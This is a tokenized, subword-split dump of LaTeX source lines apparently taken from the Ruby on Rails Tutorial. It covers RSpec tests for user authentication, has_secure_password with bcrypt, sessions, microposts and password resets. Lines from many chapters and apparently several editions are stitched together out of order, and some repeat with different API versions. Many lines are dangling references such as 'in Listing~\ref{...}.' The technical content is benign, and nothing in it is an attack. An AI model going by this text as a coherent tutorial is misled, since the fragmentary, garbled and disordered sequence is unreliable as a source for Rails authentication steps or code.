▁If ▁the ▁given ▁password ▁matches ▁the ▁user ' s ▁password , ▁it ▁should ▁return ▁the ▁user ; ▁otherwise , ▁it ▁should ▁return ▁\ k ode { false }.
▁As ▁usual , ▁we ▁can ▁express ▁the ▁requirement ▁for ▁\ k ode { authenticate } ▁using ▁RSpec .
▁The ▁result ing ▁tests ▁are ▁more ▁advanced ▁than ▁the ▁other s ▁we ' ve ▁seen , ▁so ▁let ' s ▁break ▁them ▁down ▁into ▁pieces ; ▁if ▁you ' re ▁new ▁to ▁RSpec , ▁you ▁m ight ▁want ▁to ▁read ▁this ▁section ▁a ▁couple ▁of ▁time s .
▁We ▁start ▁by ▁requiring ▁a ▁User ▁object ▁to ▁respond ▁to ▁\ k ode { authenticate } :
▁We ▁the n ▁cover ▁the ▁two ▁cases ▁of ▁password ▁match ▁and ▁m is match :
▁let (: f ound _ user ) ▁ { ▁User . find _ by ( email : ▁@ user . email ) ▁ }
▁The ▁\ k ode { before } ▁block ▁save s ▁the ▁user ▁to ▁the ▁database ▁so ▁that ▁it ▁can ▁be ▁retrieved ▁using ▁\ k ode { find \_ by }, ▁which ▁we ▁accomplish ▁using ▁the ▁\ k ode { let } ▁method :
▁We ' ve ▁used ▁\ k ode { let } ▁in ▁a ▁couple ▁of ▁ exercises , ▁but ▁this ▁is ▁the ▁first ▁time ▁we ' ve ▁seen ▁it ▁in ▁the ▁body ▁of ▁the ▁tutorial .
▁Note ▁that ▁the ▁tests ▁in
▁use ▁\ k ode { let } ▁a ▁second ▁time , ▁and ▁also ▁use ▁the ▁\ k ode { spec ify } ▁method .
▁This ▁is ▁just ▁a ▁ s y n on y m ▁for ▁\ k ode { it }, ▁and ▁can ▁be ▁used ▁when ▁writing ▁\ k ode { it } ▁would ▁ s ound ▁un n at ur al .
▁Using ▁\ text tt { let }
▁RSpec ' s ▁\ text tt { let } ▁method ▁provides ▁a ▁convenient ▁way ▁to ▁create ▁local ▁variables ▁inside ▁tests .
▁The ▁syntax ▁m ight ▁look ▁a ▁little ▁strange , ▁but ▁its ▁effect ▁is ▁similar ▁to ▁variable ▁assignment .
▁The ▁argument ▁of ▁\ text tt { let } ▁is ▁a ▁symbol , ▁and ▁it ▁take s ▁a ▁block ▁who se ▁return ▁value ▁is ▁assign ed ▁to ▁a ▁local ▁variable ▁with ▁the ▁symbol ' s ▁name .
▁creates ▁a ▁\ text tt { f ound \_ user } ▁variable ▁who se ▁value ▁is ▁equal ▁to ▁the ▁result ▁of ▁\ text tt { find \_ by }.
▁We ▁can ▁the n ▁use ▁this ▁variable ▁in ▁any ▁of ▁the ▁\ text tt { before } ▁or ▁\ text tt { it } ▁blocks ▁throughout ▁the ▁rest ▁of ▁the ▁test . ▁One ▁advantage ▁of ▁\ text tt { let } ▁is ▁that ▁it ▁\ emph { m emoiz es } ▁its ▁value , ▁which ▁means ▁that ▁it ▁remember s ▁the ▁value ▁from ▁one ▁ invocation ▁to ▁the ▁next .
▁( Note ▁that ▁\ href { http :// en . wiki p edia . org / wiki / M emoiz ation }{\ emph { m emoiz e } } ▁is ▁a ▁technical ▁ ter m ; ▁in ▁particular , ▁it ' s ▁\ emph { not } ▁a ▁m is s p e ll ing ▁of ▁`` me m or ize '' .)
▁In ▁the ▁present ▁case , ▁because ▁\ text tt { let } ▁m emoiz es ▁the ▁\ text tt { f ound \_ user } ▁variable , ▁the ▁\ text tt { find \_ by } ▁method ▁will ▁only ▁be ▁called ▁once ▁when ever ▁the ▁User ▁model ▁spec s ▁are ▁run .
▁F inally , ▁as ▁a ▁security ▁precaution , ▁we ' ll ▁test ▁for ▁a ▁length ▁validation ▁on ▁passwords , ▁requiring ▁that ▁they ▁be ▁at ▁least ▁ s i x ▁characters ▁long :
▁Tests ▁for ▁password ▁length ▁and ▁the ▁\ k ode { authenticate } ▁method .
▁But ▁web ▁developers ' ▁understanding ▁of ▁how ▁best ▁to ▁authenticate ▁users ▁has ▁m at ur ed ▁enough ▁that ▁it ▁now ▁comes ▁bundle d ▁with ▁the ▁latest ▁version ▁of ▁Rails .
▁As ▁a ▁result , ▁we ' ll ▁complete ▁the ▁implementation ▁of ▁secure ▁passwords ▁( and ▁get ▁to ▁a ▁green ▁test ▁suite ) ▁using ▁only ▁a ▁few ▁lines ▁of ▁code .
▁( P re s ence ▁validations ▁for ▁the ▁password ▁and ▁its ▁confirmation ▁are ▁automatically ▁added ▁by ▁\ k ode { has \_ secure \_ password }. )
▁This ▁is ▁the ▁only ▁non tr i via l ▁step , ▁and ▁in ▁the ▁latest ▁version ▁of ▁Rails ▁all ▁these ▁features ▁come ▁for ▁free ▁with ▁one ▁method , ▁\ k ode { has \_ secure \_ password } :
▁As ▁long ▁as ▁there ▁is ▁a ▁\ k ode { password \_ digest } ▁column ▁in ▁the ▁database , ▁adding ▁this ▁one ▁method ▁to ▁our ▁model ▁gives ▁us ▁a ▁secure ▁way ▁to ▁create ▁and ▁authenticate ▁new ▁users .
▁( If ▁you ' d ▁like ▁to ▁see ▁how ▁\ k ode { has \_ secure \_ password } ▁is ▁implemented , ▁I ▁suggest ▁tak ing ▁a ▁look ▁at ▁\ href { https :// github . com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password . rb }{ the ▁source ▁code ▁for ▁\ text tt { secure \_ password . rb } }, ▁which ▁is ▁well - document ed ▁and ▁quite ▁read able .
▁That ▁code ▁includes ▁the ▁lines
▁which ▁( as ▁describe d ▁in ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 0 . 0 / classes / ActiveModel / Validations / Helper Method s . html # method - i - validates _ confirmation _ of }{ Rails ▁API }) ▁ automagically ▁creates ▁an ▁attribute ▁called ▁\ k ode { password \_ confirmation }.
▁It ▁also ▁includes ▁a ▁validation ▁for ▁the ▁\ k ode { password \_ digest } ▁attribute .)
▁You ▁should ▁confirm ▁at ▁this ▁point ▁that ▁the ▁test ▁suite ▁passes :
▁This ▁also ▁gives ▁us ▁a ▁chance ▁to ▁make ▁the ▁work ▁from ▁the ▁previous ▁section s ▁feel ▁more ▁concrete ; ▁me re ly ▁getting ▁the ▁test ▁suite ▁to ▁pass ▁may ▁seem ▁an t i - c li m ac tic , ▁and ▁it ▁will ▁be ▁gra t ify ing ▁to ▁see ▁an ▁actual ▁user ▁record ▁in ▁the ▁development ▁database .
▁created _ at : ▁"2013-03-11 ▁20 : 4 5 : 19 ", ▁updated _ at : ▁"2013-03-11 ▁20 : 4 5 : 19 ",
▁password _ digest : ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 76 Z g D x O W k 6 J e 9 A 0 T t n 5 s K N a G T E m T 0 j U 7 . n ..."
▁A ▁user ▁row ▁in ▁the ▁SQLite ▁database ▁\ k ode { db / development . sqlite 3 }. ~\ href { http :// railstutorial . org / images / figures / sqlite _ user _ row _ with _ password _4_0 - full . png }{ ( full ▁size )}
▁=> ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 76 Z g D x O W k 6 J e 9 A 0 T t n 5 s K N a G T E m T 0 j U 7 . n c B J / 60 g H q "
▁We ▁can ▁also ▁verify ▁that ▁the ▁\ k ode { authenticate } ▁command ▁is ▁working ▁by ▁first ▁using ▁an ▁invalid ▁password ▁and ▁the n ▁a ▁valid ▁one :
▁Start ing ▁from ▁scratch , ▁in ▁this ▁chapter ▁we ▁created ▁a ▁working ▁User ▁model ▁with ▁\ k ode { name }, ▁\ k ode { email }, ▁and ▁ various ▁password ▁attributes , ▁together ▁with ▁validations ▁enforc ing ▁sever al ▁important ▁constraints ▁on ▁their ▁values .
▁In ▁addition , ▁we ▁can ▁secure ly ▁authenticate ▁users ▁using ▁a ▁given ▁password .
▁In ▁previous ▁versions ▁of ▁Rails , ▁such ▁a ▁f e at ▁would ▁have ▁take n ▁more ▁than ▁t w ic e ▁as ▁much ▁code , ▁but ▁because ▁of ▁the ▁compact ▁\ k ode { validates } ▁method ▁and ▁\ k ode { has \_ secure \_ password }, ▁we ▁were ▁able ▁to ▁build ▁a ▁complete ▁User ▁model ▁using ▁less ▁than ▁a ▁do z en ▁lines ▁of ▁code .
▁Then ▁merge ▁back ▁into ▁the ▁master ▁branch :
▁This ▁test ▁uses ▁the ▁\ k ode { reload } ▁method ▁for ▁reload ing ▁a ▁value ▁from ▁the ▁database ▁and ▁the ▁\ k ode { e q } ▁method ▁for ▁testing ▁equal ity .
▁as ▁show n ▁in ▁Listing ~\ ref { code : downcase _ bang }.
▁Read ▁through ▁the ▁Rails ▁API ▁entry ▁for ▁\ k ode { ActiveRecord :: Base } ▁to ▁get ▁a ▁sense ▁of ▁its ▁capabilities .
▁S t u d y ▁the ▁entry ▁in ▁the ▁Rails ▁API ▁for ▁the ▁\ k ode { validates } ▁method ▁to ▁learn ▁more ▁about ▁its ▁capabilities ▁and ▁options .
▁S p end ▁a ▁couple ▁of ▁hours ▁ play ing ▁with ▁\ href { http :// www . rubular . com /}{ Rubular }.
▁The ▁method ▁is ▁to ▁require ▁each ▁user ▁to ▁have ▁a ▁password ▁( with ▁a ▁password ▁confirmation ), ▁and ▁the n ▁store ▁an ▁encrypted ▁version ▁of ▁the ▁password ▁in ▁the ▁database .
▁The ▁method ▁for ▁ authenticating ▁users ▁will ▁be ▁to ▁take ▁a ▁submitted ▁password , ▁encrypt ▁it , ▁and ▁compare ▁the ▁result ▁to ▁the ▁encrypted ▁value ▁store d ▁in ▁the ▁database .
▁By ▁compar ing ▁encrypted ▁values ▁instead ▁of ▁raw ▁passwords , ▁we ▁will ▁be ▁able ▁to ▁authenticate ▁users ▁without ▁storing ▁the ▁passwords ▁themselves .
▁We ' ll ▁use ▁the ▁state - of - the - ar t ▁hash ▁function ▁called ▁\ href { http :// en . wiki p edia . org / wiki / B crypt }{ bcrypt } ▁to ▁ ir r ever s i b ly ▁encrypt ▁the ▁password ▁to ▁form ▁the ▁password ▁hash .
▁S ec on d , ▁we ▁need ▁to ▁add ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes , ▁require ▁the ▁presence ▁of ▁the ▁password , ▁require ▁that ▁they ▁match , ▁and ▁add ▁an ▁\ k ode { authenticate } ▁method ▁to ▁compare ▁an ▁encrypted ▁password ▁to ▁the ▁\ k ode { password \_ digest } ▁to ▁authenticate ▁users .
▁This ▁is ▁the ▁encrypted ▁version ▁of ▁the ▁password ▁(\ k ode {" foobar " }) ▁used ▁to ▁initialize ▁the ▁user ▁object .
▁as ▁seen ▁in ▁Listing ~\ ref { code : hello _ world }.
▁page ▁to ▁show ▁user ▁with ▁id ▁\ text tt {1}
▁page ▁to ▁edit ▁user ▁with ▁id ▁\ text tt {1}
▁update ▁user ▁with ▁id ▁\ text tt {1}
▁delete ▁user ▁with ▁id ▁\ text tt {1}
▁from ▁Listing ~\ ref { code : hello _ root _ route } ▁to
▁It ▁is ▁possible , ▁of ▁course , ▁to ▁arrange ▁for ▁this ▁information ▁to ▁be ▁handle d ▁secure ly ▁( by ▁ having ▁Git ▁ignore ▁it , ▁for ▁example ), ▁but ▁this ▁is ▁error - prone ▁and ▁requires ▁significant ▁ expert is e .
▁The ▁page ▁is ▁identical ▁to ▁F igure ~\ ref { fig : hello _ world _ first _ app }, ▁but ▁now ▁it ' s ▁running ▁in ▁a ▁production ▁environment ▁on ▁the ▁live ▁web .
▁< n > ▁ $ ▁kill ▁- 9 ▁1 22 4 1
▁< n > ▁ $ ▁p k i ll ▁- 9 ▁- f ▁ spring
▁Any ▁time ▁something ▁is n ' t ▁be having ▁as ▁expected ▁or ▁a ▁process ▁appears ▁to ▁be ▁f r o z en , ▁it ' s ▁a ▁good ▁idea ▁to ▁run ▁\ text tt { p s ▁aux } ▁to ▁see ▁what ' s ▁going ▁on , ▁and ▁the n ▁run ▁\ text tt { k i ll ▁- 9 ▁< p id > } ▁or ▁\ text tt { p k i ll ▁- 9 ▁- f ▁< name > } ▁to ▁clear ▁things ▁up .
▁This ▁is ▁because ▁\ k ode { rails ▁new } ▁generates ▁single - quot ed ▁strings , ▁whereas ▁the ▁\ href { https :// github . com / k er n / mini test - reporters }{ MiniTest ▁ reporters ▁documentation } ▁uses ▁double - quot ed ▁strings .
▁A ▁partial ▁for ▁the ▁\ k ode { new } ▁and ▁\ k ode { edit } ▁form ▁fields .
▁as ▁seen ▁in ▁Listing ~\ ref { code : allow _ blank _ password }.
▁Note ▁that ▁the ▁\ k ode { remember \_ token } ▁argument ▁in ▁the ▁\ k ode { authenticated ?}\ ▁method ▁defined ▁in ▁Listing ~\ ref { code : authenticated _ p } ▁is ▁not ▁the ▁same ▁as ▁the ▁ accessor ▁that ▁we ▁defined ▁in ▁Listing ~\ ref { code : user _ model _ remember } ▁using ▁\ k ode { attr \_ accessor ▁: remember \_ token } ; ▁instead , ▁it ▁is ▁a ▁variable ▁local ▁to ▁the ▁method .
▁Because ▁we ▁configured ▁Bundler ▁not ▁to ▁install ▁production ▁gems ▁( Section ~\ ref { sec : sample _ app _ setup }), ▁Listing ~\ ref { code : unicorn _ gemfile } ▁won ' t ▁add ▁any ▁gems ▁to ▁the ▁development ▁environment , ▁but ▁we ▁ still ▁need ▁to ▁run ▁Bundler ▁to ▁update ▁\ k ode { Gemfile . lock } :
▁As ▁seen ▁in ▁F igure ~\ ref { fig : filled _ in _ form }, ▁text ▁and ▁email ▁fields ▁(\ k ode { type =" text "} ▁and ▁\ k ode { type =" email " }) ▁simply ▁display ▁their ▁contents , ▁whereas ▁password ▁fields ▁(\ k ode { type =" password " }) ▁ ob sc ure ▁the ▁input ▁for ▁security ▁purposes , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : filled _ in _ form }.
▁in ▁Listing ~\ ref { code : base _ title _ test }.
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4.2.0 . be t a 4 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁S ol u t ion s ▁M an u al ▁for ▁ Ex er ci s es
▁The ▁second ▁main ▁way ▁to ▁update ▁multiple ▁attributes ▁is ▁to ▁use ▁\ k ode { update \_ attributes }
▁As ▁in ▁Listing ~\ ref { code : email _ format _ validation _ tests }, ▁Listing ~\ ref { code : email _ format _ validation _ tests } ▁includes ▁a ▁custom ▁error ▁message ▁to ▁identify ▁the ▁exact ▁address ▁ ca using ▁any ▁failure .
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4.2.0 . be t a 2 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁as ▁show n ▁in ▁Listing ~\ ref { code : debugger }.
▁( F igure ~\ ref { fig : signup _ failure _ 3 r d _ edit ion } ▁also ▁shows ▁the ▁\ emph { web ▁console }, ▁which ▁open s ▁a ▁Rails ▁console ▁in ▁the ▁browser ▁to ▁assist ▁in ▁debugging .
▁In ▁Listing ~\ ref { code : generating _ pages }, ▁note ▁that ▁we ▁have ▁passed ▁the ▁controller ▁name ▁as ▁ CamelCase , ▁which ▁lead s ▁to ▁the ▁creation ▁of ▁a ▁controller ▁file ▁written ▁in ▁\ href { https :// en . wiki p edia . org / wiki / S n a k e _ case }{ s n a k e ▁case }, ▁so ▁that ▁a ▁controller ▁called ▁StaticPages ▁yields ▁a ▁file ▁called ▁\ k ode { static \_ pages \_ controller . rb }.
▁By ▁the ▁way , ▁it ' s ▁worth ▁noting ▁that ▁\ k ode { rails ▁g } ▁is ▁a ▁shortcut ▁for ▁\ k ode { rails ▁generate }, ▁which ▁is ▁only ▁one ▁of ▁sever al ▁shortcut s ▁supported ▁by ▁Rails ▁( Table ~\ ref { table : s h or t cut s }).
▁On ce ▁you ' ve ▁created ▁the ▁\ k ode { about . html . erb } ▁file ▁in ▁the ▁right ▁directory , ▁you ▁should ▁fill ▁it ▁with ▁the ▁contents ▁show n ▁in ▁Listing ~\ ref { code : custom _ about _ page }.
▁We ▁can ▁put ▁the ▁\ k ode { log \_ out } ▁method ▁to ▁use ▁in ▁the ▁Sessions ▁controller ' s ▁\ k ode { destroy } ▁action , ▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ session }.
▁The ▁application ▁code ▁simply ▁involve s ▁calling ▁\ k ode { log \_ out } ▁only ▁if ▁\ k ode { logged \_ in ?}\ ▁is ▁true , ▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ forget }.
▁in ▁Listing ~\ ref { code : password _ reset _ integration _ test }.
▁in ▁Listing ~\ ref { code : branch _ raise }.
▁in ▁Listing ~\ ref { code : rails _ routes _ root _ route }.
▁Note ▁how ▁similar ▁the ▁final ▁step ▁is ▁to ▁logging ▁a ▁user ▁in , ▁where ▁we ▁retrieve ▁the ▁user ▁by ▁email ▁address ▁and ▁the n ▁verify ▁( using ▁the ▁\ k ode { authenticate } ▁method ) ▁that ▁the ▁submitted ▁password ▁matches ▁the ▁password ▁digest ▁( Listing ~\ ref { code : log _ in _ success }).
▁in ▁Listing ~\ ref { code : authenticated _ p }.
▁in ▁Listing ~\ ref { code : log _ in _ success }.
▁in ▁Listing ~\ ref { code : title _ tests } ▁and
▁* ▁This ▁is ▁a ▁manifest ▁file ▁that ' ll ▁automatically ▁include ▁all ▁the ▁stylesheets
▁* ▁available ▁in ▁this ▁directory ▁and ▁any ▁sub - d ir ec to r ies .
▁* ▁application - wide ▁style s ▁to ▁this ▁file ▁and ▁they ' ll ▁appear ▁at ▁the ▁to p ▁of ▁the
▁* ▁ compiled ▁file , ▁but ▁it ' s ▁generally ▁better ▁to ▁create ▁a ▁new ▁file ▁per ▁style
▁* ▁scope .
▁* = ▁require _ self
▁* = ▁require _ tree ▁ .
▁* = ▁require _ tree ▁ .
▁* = ▁require _ self
▁User ▁add ▁some ▁examples ▁to ▁( or ▁delete )
▁/ Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec . rb
▁( N o t ▁ Y et ▁Implement ed )
▁in ▁Listing ~\ ref { code : name _ presence _ test }.
▁( S ince ▁screencasts ▁allow ▁for ▁a ▁more ▁increment al ▁development ▁approach , ▁interest ed ▁readers ▁should ▁consider ▁the ▁\ href { http :// www . railstutorial . org / screencasts }{ Ruby ▁on ▁Rails ▁Tutorial ▁screencasts } ▁for ▁a ▁full er ▁understanding ▁of ▁this ▁material .)
▁which ▁( as ▁describe d ▁in ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 1 . 5 / classes / ActiveModel / Validations / Helper Method s . html # method - i - validates _ confirmation _ of }{ Rails ▁API }) ▁ automagically ▁creates ▁an ▁attribute ▁called ▁\ k ode { password \_ confirmation }.
▁end
▁as ▁show n ▁in ▁Listing ~\ ref { code : microposts _ create _ action _ with _ feed }.
▁As ▁we ▁saw ▁brief ly ▁before ▁in ▁the ▁Chapter ~\ ref { cha : a _ demo _ app } ▁ exercises , ▁the ▁way ▁to ▁validate ▁the ▁presence ▁of ▁the ▁name ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { validates } ▁method ▁with ▁argument ▁\ k ode { presence : ▁true }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name }.
▁See ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 1 . 4 / classes / ActiveRecord / Callbacks . html }{ Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁which ▁( as ▁describe d ▁in ▁the ▁\ href { http :// api . rubyonrails . org / v 4 . 1 . 4 / classes / ActiveModel / Validations / Helper Method s . html # method - i - validates _ confirmation _ of }{ Rails ▁API }) ▁ automagically ▁creates ▁an ▁attribute ▁called ▁\ k ode { password \_ confirmation }.
▁In ▁Chapter ~\ ref { cha : sign _ in _ sign _ out }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁To ▁get ▁started ▁with ▁static ▁pages , ▁we ' ll ▁first ▁generate ▁a ▁controller ▁using ▁the ▁same ▁Rails ▁\ k ode { generate } ▁ script ▁we ▁used ▁in ▁Chapter ~\ ref { cha : a _ demo _ app } ▁to ▁generate ▁scaffolding .
▁as ▁show n ▁in ▁Listing ~\ ref { code : adding _ the _ about _ page }.
▁We ' ll ▁write ▁simple ▁tests ▁for ▁each ▁of ▁the ▁title s ▁in ▁Table ~\ ref { table : static _ pages } ▁by ▁com bin ing ▁the ▁tests ▁in ▁Listing ~\ ref { code : about _ page _ content _ spec } ▁with ▁the ▁\ k ode { assert \_ select } ▁method , ▁which ▁let s ▁us ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁HTML ▁tag ▁( s ometimes ▁called ▁a ▁`` select or '' , ▁hence ▁the ▁name )
▁from ▁Listing ~\ ref { code : html _ structure } ▁to
▁We ▁first ▁saw ▁microposts ▁in ▁ l ar v al ▁form ▁in ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁and ▁in ▁this ▁chapter ▁we ▁will ▁make ▁a ▁full - strength ▁version ▁of ▁the ▁sketch ▁from ▁Section ~\ ref { sec : microposts _ resource } ▁by ▁construct ing ▁the ▁Micropost ▁data ▁model , ▁associat ing ▁it ▁with ▁the ▁User ▁model ▁using ▁the ▁\ k ode { has \_ many } ▁and ▁\ k ode { belongs \_ to } ▁methods , ▁and ▁the n ▁making ▁the ▁forms ▁and ▁partials ▁needed ▁to ▁manipulate ▁and ▁display ▁the ▁results ▁( including , ▁in ▁Section ~\ ref { sec : microposts _ with _ images }, ▁uploaded ▁images ).
▁S u b m it ting ▁the ▁\ href { http ://0.0.0.0:3000/ sessions / new }{/ sessions / new } ▁form ▁the n ▁yields ▁the ▁result ▁show n ▁in ▁F igure ~\ ref { fig : initial _ failed _ signin _ rails _3} .
▁Of ▁course , ▁this ▁simplicity ▁is ▁a ▁sign ▁of ▁being ▁\ emph { more } ▁advanced , ▁not ▁less --- we ' ve ▁come ▁a ▁long ▁way ▁since ▁our ▁re li ance ▁on ▁scaffolding ▁in ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁and ▁we ▁no ▁longer ▁need ▁most ▁of ▁its ▁complex ity .
▁C a ref ul ly ▁ inspect ing ▁the ▁debug ▁information ▁in ▁F igure ~\ ref { fig : initial _ failed _ signin _ rails _3} ▁shows ▁that , ▁as ▁hint ed ▁at ▁the ▁end ▁of ▁Section ~\ ref { sec : signin _ form }, ▁the ▁submission ▁results ▁in ▁a ▁\ k ode { params } ▁hash ▁containing ▁the ▁email ▁and ▁password ▁under ▁the ▁key ▁\ k ode { session }, ▁which ▁( o m it ting ▁some ▁irrelevant ▁details ▁used ▁internally ▁by ▁Rails ) ▁appears ▁as ▁follows :
▁Because ▁of ▁the ▁flash ▁message ▁display ▁in ▁the ▁site ▁layout ▁( Listing ~\ ref { code : layout _ flash }), ▁the ▁\ k ode { flash [: danger ]} ▁message ▁automatically ▁get s ▁displayed ; ▁because ▁of ▁the ▁Bootstrap ▁CSS , ▁it ▁automatically ▁get s ▁nice ▁styling ▁( F igure ~\ ref { fig : failed _ signin _ flash }).
▁Next , ▁we ▁need ▁a ▁test ▁to ▁capture ▁the ▁sequence ▁show n ▁in ▁F igure ~\ ref { fig : failed _ signin _ flash _ 3 r d _ edit ion } ▁and ▁F igure ~\ ref { fig : flash _ persistence _ 3 r d _ edit ion }.
▁With ▁this ▁sub st it u t ion , ▁the ▁correct ed ▁application ▁code ▁appears ▁as ▁in ▁Listing ~\ ref { code : correct _ signin _ failure }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sign _ in _ success }
▁in ▁Listing ~\ ref { code : sessions _ helper _ include }.
▁in ▁Listing ~\ ref { code : signed _ in _ p }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : layout _ signin _ signout _ links }.
▁in ▁Listing ~\ ref { code : layout _ signin _ signout _ links } ▁and
▁as ▁show n ▁in ▁Listing ~\ ref { code : signin _ upon _ signup }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : signin _ after _ signup _ test }
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : jquery _ file _ test }.
▁It ' s ▁important ▁to ▁understand ▁that ▁code ▁like ▁that ▁show n ▁in ▁Listing ~\ ref { code : jquery _ file _ test } ▁can ' t ▁actually ▁prevent ▁a ▁user ▁from ▁try ing ▁to ▁upload ▁a ▁file ▁that ' s ▁too ▁big .
▁The ▁new ▁steps ▁appear ▁in ▁Listing ~\ ref { code : user _ signout _ test }.
▁In ▁Section ~\ ref { sec : sign ing _ in }, ▁we ▁used ▁the ▁Rails ▁\ k ode { session } ▁method ▁to ▁store ▁the ▁user ' s ▁id , ▁but ▁this ▁information ▁disappear s ▁when ▁the ▁user ▁close s ▁their ▁browser .
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ working _ sign _ in _ method }, ▁information ▁store d ▁using ▁\ k ode { session } ▁is ▁automatically ▁secure , ▁but ▁this ▁is ▁not ▁the ▁case ▁with ▁information ▁store d ▁using ▁\ k ode { cookies }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }
▁Before ▁proceeding , ▁be ▁sure ▁to ▁commit ▁and ▁merge ▁your ▁changes ▁if ▁you ' re ▁using ▁Git ▁for ▁version ▁control :
▁You ▁can ▁also ▁push ▁the ▁app ▁up ▁to ▁Heroku ▁at ▁this ▁point .
▁The ▁status ▁feed ▁partial ▁def ers ▁the ▁feed ▁item ▁rendering ▁to ▁a ▁feed ▁item ▁partial ▁using ▁the ▁code
▁Here ▁we ▁pass ▁a ▁\ k ode { : collection } ▁parameter ▁with ▁the ▁feed ▁items , ▁which ▁cause s ▁\ k ode { render } ▁to ▁use ▁the ▁given ▁partial ▁(\ k ode { ' feed \_ item ' } ▁in ▁this ▁case ) ▁to ▁render ▁each ▁item ▁in ▁the ▁collection .
▁( We ▁have ▁omitted ▁the ▁\ k ode { : partial } ▁parameter ▁in ▁previous ▁rendering s , ▁writing , ▁e . g . , ▁\ k ode { render ▁' shared / micropost ' }, ▁but ▁with ▁a ▁\ k ode { : collection } ▁parameter ▁that ▁syntax ▁does n ' t ▁work .)
▁in ▁Listing ~\ ref { code : feed _ item _ partial }.
▁A ▁partial ▁for ▁a ▁single ▁feed ▁item .
▁As ▁with ▁sessions ▁( Section ~\ ref { sec : sessions _ and _ failed _ signin }), ▁we ' ll ▁model ▁account ▁activation s ▁as ▁a ▁resource ▁even ▁though ▁they ▁won ' t ▁be ▁ associated ▁with ▁an ▁Active ▁Record ▁model .
▁in ▁Listing ~\ ref { code : prev ent ing _ un activated _ signin s }.
▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁also ▁uses ▁the ▁\ k ode { assigns } ▁method ▁for ▁the ▁first ▁time ▁in ▁the ▁main ▁tutorial ; ▁as ▁explained ▁in ▁the ▁Chapter ~\ ref { cha : sign _ in _ sign _ out } ▁exercise ▁( Section ~\ ref { sec : sign _ in _ out _ exercises }), ▁\ k ode { assigns } ▁let s ▁us ▁access ▁instance ▁variables ▁in ▁the ▁corresponding ▁action .
▁in ▁Listing ~\ ref { code : test _ helper _ sign _ in }.
▁as ▁seen ▁in ▁Listing ~\ ref { code : sign _ in _ password _ resets } ▁and ▁F igure ~\ ref { fig : forgot _ password _ link }.
▁The ▁new ▁password ▁resets ▁form ▁has ▁a ▁lot ▁in ▁common ▁with ▁Listing ~\ ref { code : signin _ form _ redux } ; ▁the ▁most ▁important ▁difference s ▁are ▁the ▁use ▁of ▁a ▁different ▁resource ▁and ▁URL ▁in ▁the ▁call ▁to ▁\ k ode { form \_ for } ▁and ▁the ▁omission ▁of ▁the ▁password ▁attribute .
▁in ▁Listing ~\ ref { code : user _ relationships _ association }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : relationship _ belongs _ to }
▁\ href { http :// www . railstutorial . org / screencasts }{ The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁screencasts } : ▁I ▁have ▁prepared ▁a ▁full - length ▁screencast ▁course ▁base d ▁on ▁this ▁book .
▁\ href { http :// p eep code . com /}{ PeepCode } ▁and ▁\ href { http :// m b s y . co / 6 V Q 8 l }{ C ode ▁School } : ▁The ▁screencasts ▁at ▁ PeepCode ▁and ▁interactive ▁course s ▁at ▁Code ▁School ▁are ▁consistent ly ▁high - quality , ▁and ▁I ▁ w ar m ly ▁recommend ▁them .
▁This ▁optional ▁section ▁describe s ▁the ▁testing ▁setup ▁used ▁in ▁the ▁\ href { http :// www . railstutorial . org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁screencast ▁series }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : sessions _ helper _ authenticate }.
▁Mo v ing ▁the ▁\ k ode { signed \_ in \_ user } ▁method ▁into ▁the ▁Sessions ▁helper .
▁To ▁avoid ▁code ▁repetition , ▁you ▁should ▁also ▁remove ▁\ k ode { signed \_ in \_ user } ▁from ▁the ▁Users ▁controller ▁at ▁this ▁time .
▁If ▁we ▁were ▁to ▁add , ▁say , ▁an ▁\ k ode { index } ▁action ▁accessible ▁even ▁to ▁non - signed - in ▁users , ▁we ▁would ▁need ▁to ▁specify ▁the ▁ protected ▁actions ▁explicitly :
▁S ince ▁a ▁micropost ▁creation ▁form ▁only ▁make s ▁sense ▁in ▁the ▁context ▁of ▁a ▁particular ▁signed - in ▁user , ▁one ▁goal ▁of ▁this ▁section ▁will ▁be ▁to ▁serve ▁different ▁versions ▁of ▁the ▁Home ▁page ▁depending ▁on ▁a ▁visit or ' s ▁signin ▁status .
▁from ▁Listing ~\ ref { code : errors _ partial } ▁to
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ micropost _ different _ own er }.
